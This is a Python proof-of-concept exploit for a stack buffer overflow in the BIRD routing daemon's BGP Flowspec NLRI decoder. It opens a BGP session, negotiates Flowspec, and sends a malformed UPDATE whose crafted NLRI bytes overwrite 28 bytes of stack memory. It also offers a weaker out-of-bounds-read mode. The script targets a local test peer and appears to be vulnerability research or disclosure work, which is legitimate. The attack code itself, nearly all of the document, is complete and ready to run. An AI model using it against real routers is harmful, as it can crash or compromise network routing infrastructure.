#!/usr/bin/env python3
"""
PoC: stack buffer overflow in BIRD bgp_decode_nlri_flow4()
(proto/bgp/packets.c) via a zero-length Flowspec component followed by a
fake DST_PREFIX with prefix length 0xff.

Flow on the wire (the Flowspec IPv4 NLRI inside MP_REACH_NLRI):

    00          compressed flow length = 0  -> flow4_decode() returns VALID
    01          read by bgp_decode_nlri_flow4() as data[0] == FLOW_TYPE_DST_PREFIX
    ff          read by flow_read_ip4_part() as prefix length 255
    42 * N      in-bounds source bytes -> memcpy(BYTES(255)=32) into a 4-byte
                stack ip4_addr == 28-byte stack overflow

Usage:
    python3 send_bgp_flow_dstprefix_oob.py            # default: stack write overflow
    python3 send_bgp_flow_dstprefix_oob.py edge-read  # weaker OOB-read variant
"""
import socket
import struct
import sys
import time

MARKER = b"\xff" * 16


def msg(msg_type, payload=b""):
    return MARKER + struct.pack("!HB", 19 + len(payload), msg_type) + payload


def read_msg(sock):
    hdr = sock.recv(19)
    if len(hdr) != 19:
        raise EOFError(f"short header: {len(hdr)}")
    length = struct.unpack("!H", hdr[16:18])[0]
    msg_type = hdr[18]
    data = b""
    while len(data) < length - 19:
        chunk = sock.recv(length - 19 - len(data))
        if not chunk:
            raise EOFError("short body")
        data += chunk
    return msg_type, data


def cap(code, value=b""):
    return bytes([code, len(value)]) + value


def open_msg(my_as=65011):
    caps = b"".join([
        cap(1, struct.pack("!HBB", 1, 0, 133)),   # MP-BGP AFI=1 SAFI=133 (flowspec)
        cap(65, struct.pack("!I", my_as)),         # 4-byte ASN
    ])
    opt = bytes([2, len(caps)]) + caps
    payload = struct.pack("!BHHIB", 4, my_as, 90, 0x02020202, len(opt)) + opt
    return msg(1, payload)


def attr(code, flags, value, force_ext=False):
    if force_ext or len(value) > 255:
        return bytes([flags | 0x10, code]) + struct.pack("!H", len(value)) + value
    return bytes([flags, code, len(value)]) + value


def as_path():
    return bytes([2, 1]) + struct.pack("!I", 65011)


def mp_reach_flow4(nlri):
    # AFI=1, SAFI=133, NH len=0, reserved=0, then NLRI
    value = struct.pack("!HBBB", 1, 133, 0, 0) + nlri
    return attr(14, 0x80, value)


def build_nlri(mode):
    if mode == "stack-write":
        # 00: empty flow (len 0). 01: fake DST_PREFIX. ff: pxlen 255.
        # 40 in-bounds bytes so the 32-byte source read is valid and the
        # WRITE overflow into the 4-byte stack ip4_addr is the clean trigger.
        return b"\x00\x01\xff" + b"\x42" * 40
    elif mode == "edge-read":
        # weaker variant: 2-byte NLRI at the buffer edge -> OOB read of pxlen
        return b"\x00\x01"
    raise ValueError(mode)


def update_msg(mode):
    attrs = [
        attr(1, 0x40, b"\x00"),       # ORIGIN
        attr(2, 0x40, as_path()),     # AS_PATH
        mp_reach_flow4(build_nlri(mode)),
    ]
    block = b"".join(attrs)
    payload = struct.pack("!H", 0) + struct.pack("!H", len(block)) + block
    return msg(2, payload)


def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else "stack-write"
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)
        s.bind(("127.0.0.2", 0))
        s.connect(("127.0.0.1", 1181))
        s.sendall(open_msg())
        print("received", read_msg(s)[0])
        s.sendall(msg(4))               # KEEPALIVE
        print("received", read_msg(s)[0])
        update = update_msg(mode)
        print(f"sending mode={mode} update_len={len(update)} nlri={build_nlri(mode).hex()}")
        s.sendall(update)
        time.sleep(1)
        try:
            t, data = read_msg(s)
            print(f"post-update type={t} body_len={len(data)} data={data.hex()}")
        except Exception as e:
            print(f"post-update connection ended: {e}")


if __name__ == "__main__":
    main()
